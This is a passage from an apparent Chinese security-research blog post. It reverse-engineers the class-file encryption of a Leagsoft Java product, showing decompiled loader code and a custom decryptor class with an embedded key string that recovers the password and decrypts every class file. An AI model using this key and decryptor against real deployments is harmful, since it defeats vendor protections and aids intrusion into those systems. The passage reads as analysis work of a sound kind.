</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>ECFileConfig</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> configMap <span style=color:#f92672>=</span> null;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>ECFileConfig</span>() {
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>iniConfig</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (configMap <span style=color:#f92672>==</span> null) {
</span></span><span style=display:flex><span>            INIImpl ini <span style=color:#f92672>=</span> ECFileIni.getIni();
</span></span><span style=display:flex><span>            configMap <span style=color:#f92672>=</span> ini.getProperties(<span style=color:#e6db74>&#34;ECFile&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> getConfig() {
</span></span><span style=display:flex><span>        iniConfig();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> configMap;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//// ECFileIni.getIni();
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>ECFileIni</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> String file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;../../Ini/ECFile.ini&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> INIImpl self <span style=color:#f92672>=</span> null;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> {
</span></span><span style=display:flex><span>        self <span style=color:#f92672>=</span> init();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>ECFileIni</span>() {
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> INIImpl <span style=color:#a6e22e>init</span>() {
</span></span><span style=display:flex><span>        String code <span style=color:#f92672>=</span> FileEncode.getFileEncode(file);
</span></span><span style=display:flex><span>        INIImpl iniFile <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;asci&#34;</span>.equals(code) <span style=color:#f92672>?</span> INIUtil.getInstance(file) <span style=color:#f92672>:</span> INIUtil.getInstance(file, code);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> iniFile;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>getStringProperty</span>(String section, String property) {
</span></span><span style=display:flex><span>        String rs <span style=color:#f92672>=</span> self.getStringProperty(section, property);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;null&#34;</span>.equals(rs) <span style=color:#f92672>?</span> null : rs;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> INIImpl <span style=color:#a6e22e>getIni</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> self;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>恰好我在服务器上找到了这个文件 ECFile.ini ：</p><p><img src=https://images.payloads.online/2024-07-29-4c6797f665e41e879b8544677a77a9fb4f74bd6ba6ba16e6abaab6c5894f72c8.png alt=6></p><p>再看看<code>AgentTransformer</code> 的实现：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>AgentTransformer</span> <span style=color:#66d9ef>implements</span> ClassFileTransformer {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>[]</span> pwd;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>AgentTransformer</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>[]</span> pwd) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>pwd</span> <span style=color:#f92672>=</span> pwd;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>transform</span>(ClassLoader loader, String className, Class<span style=color:#f92672>&lt;?&gt;</span> classBeingRedefined, ProtectionDomain domain, <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> classBuffer) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (className <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> domain <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> loader <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>            String projectPath <span style=color:#f92672>=</span> domain.<span style=color:#a6e22e>getCodeSource</span>().<span style=color:#a6e22e>getLocation</span>().<span style=color:#a6e22e>getPath</span>();
</span></span><span style=display:flex><span>            projectPath <span style=color:#f92672>=</span> JarUtils.<span style=color:#a6e22e>getRootPath</span>(projectPath);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (StrUtils.<span style=color:#a6e22e>isEmpty</span>(projectPath)) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> classBuffer;
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                className <span style=color:#f92672>=</span> className.<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#e6db74>&#34;.&#34;</span>).<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;\\&#34;</span>, <span style=color:#e6db74>&#34;.&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> JarDecryptor.<span style=color:#a6e22e>getInstance</span>().<span style=color:#a6e22e>doDecrypt</span>(projectPath, className, <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>pwd</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> bytes <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> bytes<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>==</span> <span style=color:#f92672>-</span>54 <span style=color:#f92672>&amp;&amp;</span> bytes<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> <span style=color:#f92672>==</span> <span style=color:#f92672>-</span>2 <span style=color:#f92672>&amp;&amp;</span> bytes<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> <span style=color:#f92672>==</span> <span style=color:#f92672>-</span>70 <span style=color:#f92672>&amp;&amp;</span> bytes<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> <span style=color:#f92672>==</span> <span style=color:#f92672>-</span>66 <span style=color:#f92672>?</span> bytes : classBuffer;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> classBuffer;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></td></tr></table></div></div><p><code>AgentTransformer</code> 重写了<code>ClassFileTransformer</code>的<code>transform</code>方法，将每一个class和密码放入<code>JarDecryptor.doDecrypt</code>进行解密，最终返回字节码。</p><p>再来看看<code>JarDecryptor.doDecrypt</code>的实现：</p><p><img src=https://images.payloads.online/2024-07-29-6ac72116d00abdb02053e3b552699cc6179a6f2e604f1464dd560c268f157a43.png alt=7></p><p>通过<code>readEncryptedFile</code> 方法读取**<code>META-INF/.classes/</code>** 下的class文件进行解密。</p><p>回到文件目录，在META-INF下发现了许多加密的class字节码文件：</p><p><img src=https://images.payloads.online/2024-07-29-1c776fe4fe02193807e9a09ffeb672546340052de6e74e835d097554c05325f0.png alt=8></p><p>这里我通过编写一个类，调用<code>JarDecryptor.doDecrypt</code>对全部class进行了解密：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> com.leagsoft.declass.util.ECFileConfig;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.leagsoft.declass.util.EncryptUtils;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.leagsoft.declass.util.IoUtils;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.leagsoft.declass.util.StrUtils;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.File;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Main</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> String ENCRYPT_PATH <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;UniEx/META-INF/.classes/&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> String DECRYPT_PATH <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;UniEx-decode/UniExdecrypt/&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>getPassword</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            File file <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(<span style=color:#e6db74>&#34;UniEx/ec.file&#34;</span>);
</span></span><span style=display:flex><span>            Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> configMap <span style=color:#f92672>=</span> ECFileConfig.<span style=color:#a6e22e>getConfig</span>();
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> IoUtils.<span style=color:#a6e22e>readFileToByte</span>(file);
</span></span><span style=display:flex><span>            String pf <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;UniNXG-KUv1N5FQr9NtPWnK5UpJ8nnM3blCH9jYtGoXeo0bsXowOffDnW2o0DaVo41ZblSF0tNow5dPxVn8odAS9l4QxCiSvGTXhbliZF9W&#34;</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> by <span style=color:#f92672>=</span> EncryptUtils.<span style=color:#a6e22e>de</span>(bytes, pf.<span style=color:#a6e22e>toCharArray</span>(), 1);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>char</span> password<span style=color:#f92672>[]</span> <span style=color:#f92672>=</span> EncryptUtils.<span style=color:#a6e22e>rsk</span>(<span style=color:#66d9ef>new</span> String(by)).<span style=color:#a6e22e>toCharArray</span>();
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(password);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> password;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception e) {
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(e);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>         <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>char</span> password<span style=color:#f92672>[]</span> <span style=color:#f92672>=</span> getPassword();
</span></span><span style=display:flex><span>        File classFiles <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(ENCRYPT_PATH);
</span></span><span style=display:flex><span>        File<span style=color:#f92672>[]</span> fs <span style=color:#f92672>=</span> classFiles.<span style=color:#a6e22e>listFiles</span>();
